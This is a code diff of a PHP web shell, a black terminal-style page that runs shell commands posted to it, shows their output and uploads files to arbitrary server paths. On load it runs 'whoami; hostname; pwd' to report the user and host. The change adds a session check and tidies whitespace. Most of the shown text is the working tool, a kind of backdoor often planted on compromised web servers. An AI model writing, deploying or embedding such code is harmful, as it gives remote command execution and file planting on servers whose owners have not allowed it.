@@ -1,4 +1,7 @@
 <?php
+if (session_status() == PHP_SESSION_NONE) {
+  die("401 not authorized");
+}
 if ($_SESSION["authorized"] == "False") {
   die("401 not authorized");
 }
@@ -11,13 +14,13 @@ if (ISSET($_POST['cmd'])) {
     foreach ($output as $line) {
         echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
     }
-    die(); 
+    die();
 } else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
     $filename = $_FILES["file"]["name"];
     $path = $_POST['path'];
     if ($path != "/") {
         $path .= "/";
-    } 
+    }
     if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
         echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
     } else {
@@ -34,14 +37,14 @@ if (ISSET($_POST['cmd'])) {
             html, body {
                 max-width: 100%;
             }
-        
+
             body {
                 width: 100%;
                 height: 100%;
                 margin: 0;
                 background: #000;
             }
-            
+
             body, .inputtext {
                 font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                 font-size: 14px;
@@ -51,7 +54,7 @@ if (ISSET($_POST['cmd'])) {
                 line-height: 20px;
                 overflow: hidden;
             }
-        
+
             .console {
                 width: 100%;
                 height: 100%;
@@ -59,7 +62,7 @@ if (ISSET($_POST['cmd'])) {
                 position: absolute;
                 color: #fff;
             }
-            
+
             .output {
                 width: auto;
                 height: auto;
@@ -71,12 +74,12 @@ if (ISSET($_POST['cmd'])) {
                 right: 0;
                 line-height: 20px;
             }
-                                 
+
             .input form {
                 position: relative;
                 margin-bottom: 0px;
             }
-                     
+
             .username {
                 height: 30px;
                 width: auto;
@@ -104,7 +107,7 @@ if (ISSET($_POST['cmd'])) {
                 padding-left: 8px;
                 color: #fff;
             }
-            
+
             .inputtext:focus {
                 outline: none;
             }
@@ -118,7 +121,7 @@ if (ISSET($_POST['cmd'])) {
             }
 
             ::-webkit-scrollbar-thumb {
-                background: #303030; 
+                background: #303030;
             }
         </style>
     </head>
@@ -150,10 +153,10 @@ if (ISSET($_POST['cmd'])) {
             var uploadFormElement = document.getElementById("upload");
             var fileBrowserElement = document.getElementById("filebrowser");
             getShellInfo();
-            
+
             function getShellInfo() {
                 var request = new XMLHttpRequest();
-                
+
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
                         var parsedResponse = request.responseText.split("<br>");
@@ -170,20 +173,20 @@ if (ISSET($_POST['cmd'])) {
                 request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                 request.send("cmd=whoami; hostname; pwd");
             }
-                        
+
             function sendCommand() {
                 var request = new XMLHttpRequest();
                 var command = inputTextElement.value;
                 var originalCommand = command;
                 var originalDir = currentDir;
                 var cd = false;
-                
+
                 commandHistory.push(originalCommand);
                 switchCommand(commandHistory.length);
                 inputTextElement.value = "";
 
                 var parsedCommand = command.split(" ");
-                
+
                 if (parsedCommand[0] == "cd") {
                     cd = true;
                     if (parsedCommand.length == 1) {
@@ -193,7 +196,7 @@ if (ISSET($_POST['cmd'])) {
                     } else {
                         command = "cd "+currentDir+"; "+command+"; pwd";
                     }
-                    
+
                 } else if (parsedCommand[0] == "clear") {
                     outputElement.innerHTML = "";
                     return false;
@@ -203,7 +206,7 @@ if (ISSET($_POST['cmd'])) {
                 } else {
                     command = "cd "+currentDir+"; " + command;
                 }
-                
+
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
                         if (cd) {
@@ -215,7 +218,7 @@ if (ISSET($_POST['cmd'])) {
                         } else {
                             outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                             outputElement.scrollTop = outputElement.scrollHeight;
-                        } 
+                        }
                         updateInputWidth();
                     }
                 };
@@ -225,14 +228,14 @@ if (ISSET($_POST['cmd'])) {
                 request.send("cmd="+encodeURIComponent(command));
                 return false;
             }
-            
+
             function uploadFile() {
                 var formData = new FormData();
                 formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
                 formData.append('path', currentDir);
-                
+
                 var request = new XMLHttpRequest();
-                
+
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
                         outputElement.innerHTML += request.responseText+"<br>";
@@ -243,11 +246,11 @@ if (ISSET($_POST['cmd'])) {
                 request.send(formData);
                 outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
             }
-            
+
             function updateInputWidth() {
                 inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
             }
-            
+
             document.onkeydown = checkForArrowKeys;
 
             function checkForArrowKeys(e) {
@@ -259,19 +262,19 @@ if (ISSET($_POST['cmd'])) {
                     nextCommand();
                 }
             }
-            
+
             function previousCommand() {
                 if (currentCommand != 0) {
                     switchCommand(currentCommand-1);
                 }
             }
-            
+
             function nextCommand() {
                 if (currentCommand != commandHistory.length) {
                     switchCommand(currentCommand+1);
                 }
             }
-            
+
             function switchCommand(newCommand) {
                 currentCommand = newCommand;
 
@@ -282,7 +285,7 @@ if (ISSET($_POST['cmd'])) {
                     setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
                 }
             }
-            
+
             document.getElementById("form").addEventListener("submit", function(event){
                 event.preventDefault()
             });
